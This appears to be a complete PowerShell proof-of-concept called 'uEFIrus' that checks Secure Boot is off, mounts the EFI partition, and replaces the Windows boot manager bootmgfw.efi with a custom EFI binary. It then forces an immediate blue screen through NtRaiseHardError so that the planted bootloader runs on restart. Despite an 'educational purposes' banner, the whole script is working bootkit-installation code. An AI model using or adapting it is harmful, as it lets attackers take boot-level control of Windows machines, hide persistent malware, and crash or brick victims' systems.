#Requires -RunAsAdministrator

# Function to check if Secure Boot is disabled
function Test-SecureBootDisabled {
    try {
        $secureBootStatus = Get-SecureBootUEFI -Name "SecureBoot"
        return $secureBootStatus -eq $false
    }
    catch {
        Write-Host "Error checking Secure Boot status: $_"
        return $false
    }
}

# Function to mount EFI partition
function Mount-EFIPartition {
    try {
        # Get the EFI partition
        $efiPartition = Get-Partition | Where-Object { $_.Type -eq "System" }
        if (-not $efiPartition) {
            throw "EFI partition not found"
        }

        # Create mount point if it doesn't exist
        $mountPoint = "C:\EFIMount"
        if (-not (Test-Path $mountPoint)) {
            New-Item -ItemType Directory -Path $mountPoint | Out-Null
        }

        # Mount the partition
        Add-PartitionAccessPath -DiskNumber $efiPartition.DiskNumber -PartitionNumber $efiPartition.PartitionNumber -AccessPath $mountPoint
        return $mountPoint
    }
    catch {
        Write-Host "Error mounting EFI partition: $_"
        return $null
    }
}

# Function to backup original bootloader
function Backup-Bootloader {
    param (
        [string]$MountPoint
    )
    try {
        $backupPath = Join-Path $MountPoint "EFI\Microsoft\Boot\bootmgfw.efi.backup"
        $originalPath = Join-Path $MountPoint "EFI\Microsoft\Boot\bootmgfw.efi"
        
        if (Test-Path $originalPath) {
            Copy-Item -Path $originalPath -Destination $backupPath -Force
            Write-Host "Backup created at: $backupPath"
            return $true
        }
        else {
            throw "Original bootloader not found"
        }
    }
    catch {
        Write-Host "Error backing up bootloader: $_"
        return $false
    }
}

# Function to replace bootloader with custom one
function Replace-Bootloader {
    param (
        [string]$MountPoint,
        [string]$CustomEFIPath
    )
    try {
        $targetPath = Join-Path $MountPoint "EFI\Microsoft\Boot\bootmgfw.efi"
        if (Test-Path $CustomEFIPath) {
            Copy-Item -Path $CustomEFIPath -Destination $targetPath -Force
            Write-Host "Custom bootloader installed successfully"
            return $true
        }
        else {
            throw "Custom EFI binary not found at: $CustomEFIPath"
        }
    }
    catch {
        Write-Host "Error replacing bootloader: $_"
        return $false
    }
}

# Function to force a Blue Screen of Death (BSOD)
function Force-BSOD {
    try {
        # Using NtRaiseHardError (requires admin)
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        
        public static class Crash {
            [DllImport("ntdll.dll")]
            public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
            
            [DllImport("ntdll.dll")]
            public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
            
            public static void BSOD() {
                bool tmp;
                uint response;
                RtlAdjustPrivilege(19, true, false, out tmp); // SeShutdownPrivilege
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out response);
            }
        }
"@
        
        # Execute the BSOD function immediately
        [Crash]::BSOD()
        
        return $true
    }
    catch {
        return $false
    }
}

# Main execution
Write-Host "uEFIrus - EFI Bootloader Manipulation PoC"
Write-Host "========================================"
Write-Host "WARNING: This tool is for educational purposes only!"
Write-Host "Using this tool may render your system unbootable!"
Write-Host "========================================"

# Check Secure Boot status
if (-not (Test-SecureBootDisabled)) {
    Write-Host "ERROR: Secure Boot is enabled. This tool requires Secure Boot to be disabled."
    exit 1
}

# Mount EFI partition
$mountPoint = Mount-EFIPartition
if (-not $mountPoint) {
    Write-Host "Failed to mount EFI partition. Exiting..."
    exit 1
}

# Backup original bootloader
if (-not (Backup-Bootloader -MountPoint $mountPoint)) {
    Write-Host "Failed to backup original bootloader. Exiting..."
    Remove-PartitionAccessPath -DiskNumber (Get-Partition | Where-Object { $_.Type -eq "System" }).DiskNumber -PartitionNumber (Get-Partition | Where-Object { $_.Type -eq "System" }).PartitionNumber -AccessPath $mountPoint
    exit 1
}

# Replace bootloader with custom one
$customEFIPath = Join-Path $PSScriptRoot "EFI\bootmgfw.efi"
if (-not (Replace-Bootloader -MountPoint $mountPoint -CustomEFIPath $customEFIPath)) {
    Write-Host "Failed to replace bootloader. Exiting..."
    Remove-PartitionAccessPath -DiskNumber (Get-Partition | Where-Object { $_.Type -eq "System" }).DiskNumber -PartitionNumber (Get-Partition | Where-Object { $_.Type -eq "System" }).PartitionNumber -AccessPath $mountPoint
    exit 1
}

# Unmount EFI partition
Remove-PartitionAccessPath -DiskNumber (Get-Partition | Where-Object { $_.Type -eq "System" }).DiskNumber -PartitionNumber (Get-Partition | Where-Object { $_.Type -eq "System" }).PartitionNumber -AccessPath $mountPoint

Write-Host "`nOperation completed successfully!"

# Force BSOD immediately without warning
Force-BSOD 